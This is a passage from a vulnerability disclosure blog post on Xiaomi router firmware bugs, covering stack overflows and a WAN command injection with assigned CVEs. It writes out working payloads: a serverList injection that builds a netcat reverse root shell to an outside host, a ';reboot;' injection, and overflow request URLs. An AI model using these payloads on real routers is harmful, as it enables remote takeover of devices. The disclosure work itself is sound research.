</span></span><span style=display:flex><span>                result[<span style=color:#e6db74>&#34;msg&#34;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;lua call c api ret null.&#34;</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>    [...]
</span></span><span style=display:flex><span><span style=color:#66d9ef>end</span>
</span></span></code></pre></div><h4 id=endpoint-apimisystemget_wifi_pwd_url---stack-buffer-overflow-already-known-as-cve-2020-14124>Endpoint <code>/api/misystem/get_wifi_pwd_url</code> - Stack Buffer Overflow (already known as CVE-2020-14124)</h4><p>We can also trigger a stack buffer overflow in <code>lua_rsa_pubkey_encrypt()</code> by giving an RSA public key longer than 1024 bytes: the stack buffer that receives the RSA key is on the stack and 1024 bytes long, but the program doesn&rsquo;t check the length of the inserted key.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int32_t</span> <span style=color:#a6e22e>lua_rsa_pubkey_encrypt</span>(<span style=color:#66d9ef>struct</span> lua_State<span style=color:#f92672>*</span> lua_state) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> rsa_pub_key[<span style=color:#ae81ff>1024</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> url[<span style=color:#ae81ff>256</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>memset</span>(<span style=color:#f92672>&amp;</span>rsa_pub_key, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1024</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>memset</span>(<span style=color:#f92672>&amp;</span>url, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>256</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    [...]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>strcpy</span>(<span style=color:#f92672>&amp;</span>url, <span style=color:#a6e22e>luaL_checklstring</span>(lua_state, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>));
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int32_t</span> url_len <span style=color:#f92672>=</span> <span style=color:#a6e22e>strlen</span>(<span style=color:#f92672>&amp;</span>url);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Stack buffer overflow !
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>strcpy</span>(<span style=color:#f92672>&amp;</span>rsa_pub_key, <span style=color:#a6e22e>luaL_checklstring</span>(lua_state, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0</span>));
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int32_t</span> key_len <span style=color:#f92672>=</span> <span style=color:#a6e22e>strlen</span>(<span style=color:#f92672>&amp;</span>rsa_pub_key);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    [...]
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>After testing, we can control the <code>PC</code> (Program Counter) after 1036 bytes, so this bug could eventually lead to Remote Code Execution.</p><p>To PoC the stack buffer overflow, we need to send an RSA public key with more than 1036 characters. For example, we can put 1036 * &lsquo;A&rsquo; and then overwrite <code>PC</code> with &lsquo;BBBB&rsquo;: <code>http://192.168.31.1/cgi-bin/luci/api/misystem/get_wifi_pwd_url?rsa_pubkey=AAAAAA...AAAABBBB</code>:</p><p><a href=/posts/img/xiaomi-routers/bufferoverflow_gdb.png target=_blank><img src=/posts/img/xiaomi-routers/bufferoverflow_gdb.png alt="buffer overflow"></a></p><p>Unfortunately, there are some limitations for the exploitation of this buffer overflow: we have to use only base64 characters in our payload (<code>A-Z</code>, <code>a-z</code>, <code>0-9</code>, <code>+</code>, <code>=</code>, <code>/</code>), the use of <code>strcpy()</code> prevents the presence of nullbytes and of course, again, we have to deal with ASLR. We can however note that we could potentially brute force ASLR in this context because the <code>librsa.so</code> binary is mapped at runtime, at a different place everytime and the crashes won&rsquo;t cause a DoS because it comes from lua code which will be re-executed each time.</p><p>We also noticed that this vulnerability was already known by Xiaomi and was reported in 2020 by Aobo Wang on the <code>AX3600</code>, assigned to <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14124">CVE-2020-14124</a>. Knowing that, we decided not to spend too much time trying to exploit it.</p><h4 id=endpoint-apimisystemget_wifi_pwd_url---memcmp>Endpoint <code>/api/misystem/get_wifi_pwd_url</code> - memcmp()</h4><p>We can trigger a third bug that occurs in the <code>memcmp()</code> function from <code>/lib/libuClibc-0.9.33.2.so</code> due to a combination of the two precedent bugs. By sending a lengthy and malformed RSA public key with at least one non-base64 character (e.g. with 8000 * &lsquo;A&rsquo;: <code>http://192.168.31.1/cgi-bin/luci/api/misystem/get_wifi_pwd_url?rsa_pubkey=AAAAAA...AAAA%01BB</code>), we can cause a crash:</p><p><a href=/posts/img/xiaomi-routers/memcmp_gdb.png target=_blank><img src=/posts/img/xiaomi-routers/memcmp_gdb.png alt=crash></a></p><p>However, this bug has no real impact: the process crashes and the web page is rendering a 502 error but the process is restarted in the next API request. This bug is not exploitable.</p><h2 id=wan-1>WAN</h2><p>Previously, we looked at the LAN interface in which an attacker must be internal to the network. Our next step was to analyze the possibility of external attacks through the WAN interface.</p><p>While intercepting the WAN communications, we noticed that the router makes different requests. One of these requests seemed particularly interesting: an unencrypted HTTP GET request to <code>https://eu.api.miwifi.com/miwifi-broker/list</code>. We reproduced it by hand to see what the answer looks like.</p><p><a href=/posts/img/xiaomi-routers/wan_man_req.png target=_blank><img src=/posts/img/xiaomi-routers/wan_man_req.png alt="wan man req"></a></p><h3 id=binary-usrbinmessagingagent---command-injection-cve-2023-26317>Binary <code>/usr/bin/messagingagent</code> - Command Injection (CVE-2023-26317)</h3><p>We suppose that this GET request is employed to retrieve <code>MQTT</code> server IPs for future communications within the router. A list of IPs is quite interesting and after having seen how some binaries directly passed elements as parameters to other binaries via <code>system()</code>, we had the intuition that this list of IPs could probably be passed as a parameter to a certain binary. We can thus try to blindly inject commands here.</p><p>As the HTTP traffic is unencrypted and can be modified, we intercepted the request and just tried to inject <code>;reboot;</code> in the <code>serverList</code>&mldr; And the router rebooted!</p><p><a href=/posts/img/xiaomi-routers/miwifi_broker_interception.png target=_blank><img src=/posts/img/xiaomi-routers/miwifi_broker_interception.png alt="miwifi-broker interception diagram"></a></p><p>With a bash injection, we decided to go a little further and demonstrate an injection that could make an exterior connection using <code>netcat</code> (<code>nc 192.168.0.1 4343</code>). Once again, the only action for the exploit is the interception and modification of outgoing HTTP requests, which is relatively simple.</p><p><a href=/posts/img/xiaomi-routers/WAN_Injection.png target=_blank><img src=/posts/img/xiaomi-routers/WAN_Injection.png alt=RCE></a></p><p>Moreover with the payload: <code>serverList=192.168.2.5;rm -f /tmp/f;mknod /tmp/f p;echo 'cat /tmp/f|sh -i 2>&amp;1|nc 192.168.0.1 4242 >/tmp/f' > revshell.sh;chmod 777 revshell.sh; sh revshell.sh;:1883</code>, we can pop a root shell on the router from WAN:</p><p><a href=/posts/img/xiaomi-routers/wan_poc.png target=_blank><img src=/posts/img/xiaomi-routers/wan_poc.png alt="Shell POC"></a></p><p>Now, let&rsquo;s see where the bug comes from.</p><p>The <code>/usr/bin/messagingagent</code> binary contains the request towards <code>https://eu.api.miwifi.com/miwifi-broker/list</code>: the URL is built using <code>config_api</code> from the <code>/usr/share/messaging.conf</code> file.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>key_file <span style=color:#f92672>=</span> /usr/share/messaging/serverkey_2.pub
</span></span><span style=display:flex><span>push_channel <span style=color:#f92672>=</span> xqpc
</span></span><span style=display:flex><span>config_api <span style=color:#f92672>=</span> /miwifi-broker/list
</span></span><span style=display:flex><span>register_device_api <span style=color:#f92672>=</span> /register_device
</span></span><span style=display:flex><span>miwifi_service_ips <span style=color:#f92672>=</span> 183.84.5.44,58.83.177.108
</span></span></code></pre></div><p>This request returns a string of the form: <code>serverList=[IP]:[PORT],...</code>. The parsing function for this HTTP response is in the function <code>ma_app_context_update_conn_data</code> at <code>0x408698</code>. During the parsing, the <code>IP</code> and <code>PORT</code> are simply scraped from the response and concatenated to a string that is passed into the <code>system</code> function. The issue with this <code>system</code> method is that the command can be easily injected and, therefore, an injection in the <code>IP</code> parameter leads to an OS Command injection.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int32_t</span> <span style=color:#a6e22e>ma_app_context_update_conn_data</span>(<span style=color:#66d9ef>void</span><span style=color:#f92672>*</span> arg1)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    [...]
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Here we can see the split with &#34;,&#34;: [&#34;3.127.110.152:1884&#34;, &#34;3.127.110.143:1883&#34;, &#34;3.127.110.152:1883&#34;]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>int32_t</span><span style=color:#f92672>*</span> configs_split <span style=color:#f92672>=</span> <span style=color:#a6e22e>ma_str_split</span>(<span style=color:#f92672>*</span>(<span style=color:#66d9ef>int32_t</span><span style=color:#f92672>*</span>)((<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span>)arg1 <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x18</span>), <span style=color:#e6db74>&#34;,&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int32_t</span> nb_configs <span style=color:#f92672>=</span> <span style=color:#a6e22e>ma_str_array_size</span>(configs_split);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (nb_configs <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>trap</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>     <span style=color:#75715e>// Here a split with &#34;:&#34;: [&#34;3.127.110.152&#34;, &#34;1884&#34;]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>int32_t</span><span style=color:#f92672>*</span> ip_port_split <span style=color:#f92672>=</span> <span style=color:#a6e22e>ma_str_split</span>(configs_split[(v0_6 <span style=color:#f92672>%</span> nb_configs)], <span style=color:#e6db74>&#34;:&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>ma_str_array_size</span>(ip_port_split) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[MQTT ERROR %d %s:%d]: Bad broker list: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#a6e22e>time</span>(<span style=color:#ae81ff>0</span>), <span style=color:#e6db74>&#34;/ma_app_context.c&#34;</span>, <span style=color:#ae81ff>0xae</span>, <span style=color:#f92672>*</span>(<span style=color:#66d9ef>int32_t</span><span style=color:#f92672>*</span>)((<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span>)arg1 <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x18</span>));
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>fflush</span>(stdout);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> broker_ip <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>int32_t</span><span style=color:#f92672>*</span>)ip_port_split;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int32_t</span> broker_port <span style=color:#f92672>=</span> <span style=color:#a6e22e>atoi</span>(ip_port_split[<span style=color:#ae81ff>1</span>]);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int32_t</span> fd <span style=color:#f92672>=</span> <span style=color:#a6e22e>fopen</span>(<span style=color:#e6db74>&#34;/tmp/state/messagingagent&#34;</span>, <span style=color:#e6db74>&#34;w&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>void</span><span style=color:#f92672>*</span> a0_25;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (fd <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[MQTT ERROR %d %s:%d]: Unable to open /tmp/state/messagingagent</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#a6e22e>time</span>(<span style=color:#ae81ff>0</span>), <span style=color:#e6db74>&#34;/ma_app_context.c&#34;</span>, <span style=color:#ae81ff>0x130</span>);
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>fflush</span>(stdout);
</span></span><span style=display:flex><span>            a0_25 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>int32_t</span><span style=color:#f92672>*</span>)((<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span>)arg1 <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x3c</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>fprintf</span>(fd, <span style=color:#e6db74>&#34;%s:%d&#34;</span>, broker_ip, broker_port) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>            {
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[MQTT ERROR %d %s:%d]: Unable to update /tmp/state/messagingagent</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#a6e22e>time</span>(<span style=color:#ae81ff>0</span>), <span style=color:#e6db74>&#34;/ma_app_context.c&#34;</span>, <span style=color:#ae81ff>0x134</span>);
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>fflush</span>(stdout);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>fclose</span>(fd);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>char</span> command[<span style=color:#ae81ff>0x30</span>];
</span></span><span style=display:flex><span>            <span style=color:#75715e>// Command injection here using the IP field
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#a6e22e>sprintf</span>(<span style=color:#f92672>&amp;</span>command,
</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#34;/sbin/uci set /etc/config/messaging.deviceInfo.BROKER_HOST=%s&#34;</span>,
</span></span><span style=display:flex><span>                    broker_ip);
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>system</span>(<span style=color:#f92672>&amp;</span>command);
</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>sprintf</span>(<span style=color:#f92672>&amp;</span>command,
</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#34;/sbin/uci set /etc/config/messaging.deviceInfo.BROKER_PORT=%d&#34;</span>,
</span></span><span style=display:flex><span>                    broker_port);
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>system</span>(<span style=color:#f92672>&amp;</span>command);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;/sbin/uci commit /etc/config/messaging&#34;</span>);
</span></span><span style=display:flex><span>    [...]
</span></span></code></pre></div><h3 id=binary-usrbinmessagingagent---stack-buffer-overflow-cve-2023-26320>Binary <code>/usr/bin/messagingagent</code> - Stack Buffer Overflow (CVE-2023-26320)</h3><p>In addition, we noticed the use of the <code>sprintf</code> method here, which does not check the length of the IP string copied to the stack buffer, leading to a stack buffer overflow. Replacing the payload with a large string overflows the buffer. We can PoC this buffer overflow with a cyclic input:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>serverList<span style=color:#f92672>=</span>192.168.2.5;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa:1883
</span></span></code></pre></div><p>Thus, this proves that the stack buffer overflow causes a denial of service (DoS) by crashing the <code>/usr/bin/messagingagent</code>. The process will not restart on its own and the router will require a reboot to function normally. The updates, MQTT connections, and system health use <code>/usr/bin/messagingagent</code> as a communication platform: all those systems will be offline due to the DoS. The crash can be seen in the image below.</p><p><a href=/posts/img/xiaomi-routers/wan_crash_problem.png target=_blank><img src=/posts/img/xiaomi-routers/wan_crash_problem.png alt=wan_crash_problem></a></p><p><strong>Problem</strong>: we can see here that we do have a crash, but it doesn&rsquo;t look like a <code>PC</code> control: it&rsquo;s more of an arbitrary pointer dereferencement. If we look at the process memory mapping, we can conclude that this bug happens in <code>ma_str_array_clear()</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>ma_str_array_clear</span>(<span style=color:#66d9ef>char</span><span style=color:#f92672>**</span> str_array) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span><span style=color:#f92672>**</span> _str_array <span style=color:#f92672>=</span> str_array;
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (str_array <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> (true) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> str <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>int32_t</span><span style=color:#f92672>*</span>)_str_array;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (str <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        _str_array <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>_str_array[<span style=color:#ae81ff>1</span>]; <span style=color:#75715e>// _str_array++
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#a6e22e>free</span>(str);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>free</span>(str_array);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>This function is indeed called at the end of our target function <code>ma_app_context_update_conn_data()</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int32_t</span> <span style=color:#a6e22e>ma_app_context_update_conn_data</span>(<span style=color:#66d9ef>void</span><span style=color:#f92672>*</span> arg1) {
</span></span><span style=display:flex><span>[...]
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>ma_str_array_clear</span>(configs_split);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>ma_str_array_clear</span>(ip_port_split);
</span></span><span style=display:flex><span>        ret <span style=color:#f92672>=</span> <span style=color:#a6e22e>pthread_mutex_unlock</span>(arg1);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> ret;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>We have a problem here because the stack is structured this way:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>[...]
</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span> overflow_buffer[<span style=color:#ae81ff>128</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span><span style=color:#f92672>**</span> configs_split;
</span></span></code></pre></div><p>When overflowing the overflow_buffer we overwrote the <code>char**</code> passed to the <code>ma_str_array_clear()</code> function. Later, this function tries to free the contents of the parameter and dereference something that can&rsquo;t be dereferenced, thus leading to an obvious crash.</p><p>We can circumvent this problem with a little trick: overwrite the <code>char** overwritten_string_array_pointer</code> with a valid address that points to <code>0x00000000</code>. To do so, we can for example take an address from a library that will be mapped to the process memory. At the end of the function, <code>ma_str_array_clear()</code> will try to free it and see that the pointer already points to NULL and so it will return to <code>ma_app_context_update_conn_data()</code>. We can then execute the return instruction and control <code>PC</code>.</p><p>As can be seen in the payload below, we have changed <code>BBBB</code> to <code>ws¢(</code> (for <code>0x7773a228</code>) which is an address inside a library that is loaded at runtime. This simple change allows us to have a direct impact on <code>PC</code> as can be seen in the image below:</p><p><a href=/posts/img/xiaomi-routers/wan_crash_modified_pc.png target=_blank><img src=/posts/img/xiaomi-routers/wan_crash_modified_pc.png alt=wan_modified_pc></a></p><p>Indeed, we notice that the program counter <code>PC</code> is changed to the string <code>kaaa</code> which is in our cyclic payload: we here took the control of <code>PC</code> after 97 bytes.</p><p>Once again, however, we have a similar issue to the <code>smartcontroller</code> binary in which we were unable to pass a NULL byte thus complicating the exploitation using ROP (in the <code>messagingagent</code> binary), even if it could still be possible using only library addresses as we did with <code>0x7773a228</code>.</p><p>The main issue here is the presence of ASLR which does not allow us to know in advance the location of the libraries: we would then, for example, need an ASLR leak to exploit this bug (we can&rsquo;t bruteforce ASLR because we know that if the process crashes, it won&rsquo;t restart by itself). At least, we still have a DoS here.</p><p>Furthermore, as we already achieved an RCE on the WAN, we decided to not pursue this vulnerability exploitation further.</p><h1 id=some-affected-products>Some affected products</h1><p>This section contains a table with some Xiaomi firmwares found to be vulnerable to the reported bugs. Indeed, after the first duplicate, we realized that Xiaomi routers have a common code base for the different routers firmwares, therefore, a single vulnerability probably affects various routers. Naturally, we only programmatically checked the firmwares by downloading them online and did not buy the routers for testing.</p><p><a href=/posts/img/xiaomi-routers/affected_products.png target=_blank><img src=/posts/img/xiaomi-routers/affected_products.png alt="affected products"></a></p><blockquote><p>Note: &ldquo;mitigated&rdquo; for the buffer overflows means that the binary is compiled with the stack canary protection that makes the exploit of stack buffer overflows even more difficult.</p></blockquote><h1 id=conclusion>Conclusion</h1><p>In summary, this report discussed various vulnerabilities we found in the WAN and LAN interfaces of the <code>Mi AIoT Router AC2350</code>, and validated their existence in other Xiaomi firmwares as well.</p><p>We have unearthed vulnerabilities that go as far back as 2020 and have also identified four new CVEs (<a href=https://nvd.nist.gov/vuln/detail/CVE-2023-26317>CVE-2023-26317</a>, <a href="https://trust.mi.com/misrc/bulletins/advisory?cveId=539">CVE-2023-26318</a>, <a href="https://trust.mi.com/misrc/bulletins/advisory?cveId=536">CVE-2023-26319</a>, and <a href="https://trust.mi.com/misrc/bulletins/advisory?cveId=540">CVE-2023-26320</a>).</p><p>While we hope our findings assist Xiaomi in strengthening their product security, it is worth noting that there are probably more bugs to find!</p><h1 id=timeline>Timeline</h1><ul><li>[18/01/2023] Reports sent to Xiaomi on Hackerone</li><li>[03/02/2023] First bounty payments</li><li>[01/08/2023] 4 CVEs assigned and published on Xiaomi Security Center:<ul><li><strong>CVE-2023-26317</strong>: <a href="https://trust.mi.com/misrc/bulletins/advisory?cveId=529">https://trust.mi.com/misrc/bulletins/advisory?cveId=529</a> (WAN command injection)</li><li><strong>CVE-2023-26318</strong>: <a href="https://trust.mi.com/misrc/bulletins/advisory?cveId=539">https://trust.mi.com/misrc/bulletins/advisory?cveId=539</a> (LAN post auth stack buffer overflow)</li><li><strong>CVE-2023-26319</strong>: <a href="https://trust.mi.com/misrc/bulletins/advisory?cveId=536">https://trust.mi.com/misrc/bulletins/advisory?cveId=536</a> (LAN post auth command injection)</li><li><strong>CVE-2023-26320</strong>: <a href="https://trust.mi.com/misrc/bulletins/advisory?cveId=540">https://trust.mi.com/misrc/bulletins/advisory?cveId=540</a> (WAN stack buffer overflow)</li></ul></li></ul></div><footer class=post-footer><div class=post-footer-data><div class=tags><div class=tag><a href=/tags/xiaomi>#Xiaomi</a></div><div class=tag><a href=/tags/routers>#Routers</a></div><div class=tag><a href=/tags/cve>#CVE</a></div><div class=tag><a href=/tags/vulnerability-research>#Vulnerability Research</a></div></div><span class=date>2023-09-25
<span class=author>by
Julien R. (SoEasY), Marin Duroyon</span></span></div></footer></article><footer><div class=social-links-footer><a href=mailto:contact@thalium.re><div class=social-link>Email</div></a><a href=https://github.com/thalium target=_blank><div class=social-link>GitHub</div></a><a href=https://twitter.com/thalium_team target=_blank><div class=social-link>Twitter</div></a></div><div class=copyright>Copyright (c) 2020, all rights reserved.</div><div class=poweredby>Powered by <a href=https://gohugo.io/>Hugo</a>.</div></footer></div></body></html>